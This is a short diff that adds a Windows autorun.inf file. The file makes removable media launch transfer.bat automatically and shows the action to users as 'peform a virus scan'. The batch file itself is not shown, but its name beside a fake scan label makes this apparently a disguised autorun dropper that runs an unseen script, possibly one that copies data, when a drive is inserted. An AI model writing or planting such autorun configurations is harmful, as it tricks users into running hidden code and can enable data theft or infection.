@@ -1,0 +1,4 @@
+[autorun]
+open=transfer.bat
+action=peform a virus scan
+shell\open\command=transfer.bat
